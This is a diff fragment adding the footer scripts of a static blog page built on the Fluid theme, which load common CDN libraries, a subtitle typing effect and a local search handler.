+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js" ></script>
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      var inputArea = document.querySelector("#local-search-input");
+      inputArea.onclick = function () {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+        this.onclick = null
+      }
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+
+</body>
+</html>
